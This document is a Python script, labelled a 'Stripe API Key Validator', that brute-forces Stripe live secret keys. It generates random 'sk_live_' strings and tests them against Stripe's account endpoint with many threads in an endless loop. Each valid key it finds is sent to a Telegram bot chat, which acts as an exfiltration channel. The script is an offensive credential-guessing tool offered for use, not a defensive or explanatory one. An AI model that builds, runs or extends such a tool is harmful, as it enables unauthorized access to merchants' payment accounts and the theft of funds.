# ┌─────────────────────────────────────────────────────────────┐
# │                Stripe API Key Validator Script              │
# │                                                             │
# │  Author    : Mehdi Rezaei Far                               │
# │  GitHub    : https://github.com/mehdirzfx                   │
# │  Date      : 2024-11-06 ، 1403-08-16                        │
# │  Copyright : © 2024 mehdirzfx. All rights reserved.         │
# └─────────────────────────────────────────────────────────────┘
#
# Description: Generates and validates random Stripe API keys.
# ─── Importing Libraries ─────────────────────────────────────────────
import argparse
import requests
import secrets
import string
import logging
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
import time
from threading import Semaphore
# ─── initial: Configuration Logs ────────────────────────────────────
init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(message)s'
)
class CustomFormatter(logging.Formatter):
    def format(self, record):
        if record.levelno == logging.INFO:
            record.msg = f"{Fore.GREEN}{record.msg}{Style.RESET_ALL}"
        elif record.levelno == logging.WARNING:
            record.msg = f"{Fore.YELLOW}{record.msg}{Style.RESET_ALL}"
        elif record.levelno == logging.ERROR:
            record.msg = f"{Fore.RED}{record.msg}{Style.RESET_ALL}"
        return super().format(record)

logger = logging.getLogger()
for handler in logger.handlers:
    handler.setFormatter(CustomFormatter('%(asctime)s - %(levelname)s - %(message)s'))

# ─── Telegram : Configuration Telegram Bot ────────────────────────────────────
TOKEN = '<TOKEN>'
CHAT_ID = '<CHAT_ID>'  
TOPIC_ID = '<ID>'  

# ─── Function: Generate stripe api key ────────────────────────────────────
def generate_live_stripe_api_key(key_length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(secrets.choice(characters) for _ in range(key_length))
    api_key = f"sk_live_{random_string}"
    return api_key
# ─── Function: Telegram Message Sender ────────────────────────────────────
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "message_thread_id": TOPIC_ID
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code != 200:
            logger.error(f"[x] Failed to send message: {response.text}")
    except requests.RequestException as e:
        logger.error(f"[x] Telegram request failed with error: {e}")
# ─── Function: Check Stripe Key ────────────────────────────────────
def check_key_validity(sem, key_length):
    with sem: 
        api_key = generate_live_stripe_api_key(key_length)
        try:
            url = "https://api.stripe.com/v1/account"
            headers = {"Authorization": f"Bearer {api_key}"}
            
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                logger.info(f"[*] Valid key found: {api_key}")
                send_telegram_message(f"[*] Valid SK_Live key : {api_key}") 
            elif response.status_code in [401, 403]:
                logger.warning(f"[-] Invalid key: {api_key}")
            else:
                logger.error(f"[!] Unexpected {response.status_code} for key: {api_key}")

        except requests.RequestException as e:
            logger.error(f"[x] Request failed for key: {api_key} with error: {e}")
# ─── Configs: Threads Configuration ────────────────────────────────────
def run_with_threads(max_workers, key_length):
    sem = Semaphore(max_workers)
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        while True:
            executor.submit(check_key_validity, sem, key_length)
            time.sleep(0.1) 

# ─── Main Function: GET Argument & Running APP ────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="A script to check the validity of Stripe keys.")
    parser.add_argument("-t", type=int, default=30, help="Number of concurrent threads (default is 30)")
    parser.add_argument("-l", type=int, default=36, help="Length of the generated API key (default is 36)")
    args = parser.parse_args()
    
    run_with_threads(args.t, args.l)
